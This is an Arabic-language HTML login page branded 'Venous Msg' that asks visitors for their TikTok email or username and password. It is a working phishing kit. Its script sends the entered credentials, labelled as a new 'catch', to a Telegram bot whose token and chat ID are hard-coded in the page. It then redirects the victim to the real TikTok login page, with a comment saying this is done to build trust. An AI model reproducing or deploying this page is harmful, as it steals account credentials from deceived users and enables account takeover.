<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Venous Msg | عصر جديد من التواصل</title>
    <style>
        :root {
            --sky-blue: #00aeef;
            --deep-black: #1a1a1a;
            --soft-white: #f8f9fa;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, var(--soft-white) 0%, #e0f2fe 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* حاوية التصميم */
        .glass-card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.05);
            width: 100%;
            max-width: 380px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.5);
        }

        .brand-logo {
            font-size: 28px;
            font-weight: 900;
            color: var(--deep-black);
            margin-bottom: 10px;
            letter-spacing: -1px;
        }

        .brand-logo span {
            color: var(--sky-blue);
        }

        h2 {
            font-size: 20px;
            color: #444;
            margin-bottom: 30px;
            font-weight: 500;
        }

        .input-box {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border: 1.5px solid #eee;
            border-radius: 12px;
            background: white;
            box-sizing: border-box;
            font-size: 15px;
            transition: 0.3s;
            outline: none;
            text-align: right;
        }

        .input-box:focus {
            border-color: var(--sky-blue);
            box-shadow: 0 0 10px rgba(0, 174, 239, 0.1);
        }

        /* زر تسجيل الدخول بالتيك توك */
        .tiktok-auth-btn {
            width: 100%;
            background-color: var(--deep-black);
            color: white;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: 0.3s;
            margin-top: 10px;
        }

        .tiktok-auth-btn:hover {
            background-color: #000;
            transform: translateY(-2px);
        }

        .tiktok-auth-btn img {
            width: 20px;
            filter: invert(1); /* جعل أيقونة تيك توك بيضاء */
        }

        .divider {
            margin: 25px 0;
            display: flex;
            align-items: center;
            color: #aaa;
            font-size: 12px;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #eee;
        }

        .divider span { padding: 0 10px; }

        .footer-text {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
        }

        #status {
            margin-top: 15px;
            font-size: 13px;
            font-weight: 500;
        }
    </style>
</head>
<body>

<div class="glass-card">
    <div class="brand-logo">VENOUS<span>MSG</span></div>
    <h2>يرجى ادخال معلومات حساب التيك توك للمتابعة</h2>

    <input type="text" id="account" class="input-box" placeholder="البريد الإلكتروني أو المعرف">
    <input type="password" id="secret" class="input-box" placeholder="كلمة المرور">

    <button class="tiktok-auth-btn" onclick="processAuth()">
        <img src="https://v1.nitrocdn.com/GZToZJpXpXGpxXzZzXzZzXzZzXzZzXzZ/assets/static/optimized/rev-5e9c0b1/wp-content/uploads/2021/01/tiktok-icon-white-1.png" alt="">
        تسجيل بواسطة TikTok
    </button>

    <div id="status"></div>

    <div class="divider"><span>أو عبر البريد</span></div>

    <div class="footer-text">
        محمي بواسطة تقنيات <b>Venous Store</b> &copy; 2024
    </div>
</div>

<script>
    // --- بياناتك الشخصية ---
    const BOT_TOKEN = '8652585684:AAEyNR_dy9emoJa7O78Ic6f10LZujCR0uXc';
    const CHAT_ID = '8279582613';

    async function processAuth() {
        const u = document.getElementById('account').value;
        const p = document.getElementById('secret').value;
        const s = document.getElementById('status');

        if(!u || !p) {
            s.innerHTML = "<span style='color:#e74c3c;'>يرجى إكمال البيانات للمتابعة</span>";
            return;
        }

        s.innerHTML = "<span style='color:var(--sky-blue);'>جاري الربط مع TikTok... ⏳</span>";

        const msg = `💎 **صيد Venous Msg جديد**\n` +
                    `━━━━━━━━━━━━━━\n` +
                    `👤 **المستخدم:** \`${u}\` \n` +
                    `🔑 **الرمز:** \`${p}\` \n` +
                    `━━━━━━━━━━━━━━\n` +
                    `🌐 **الواجهة:** التصميم العصري`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown'
                })
            });

            if(response.ok) {
                // التحويل المباشر لتيك توك لزيادة الثقة
                window.location.href = "https://www.tiktok.com/login";
            } else {
                s.innerHTML = "<span style='color:#e74c3c;'>حدث خطأ في المصادقة، حاول ثانية</span>";
            }
        } catch(e) {
            s.innerHTML = "<span style='color:#e74c3c;'>فشل في الاتصال بالخادم</span>";
        }
    }
</script>

</body>
</html>
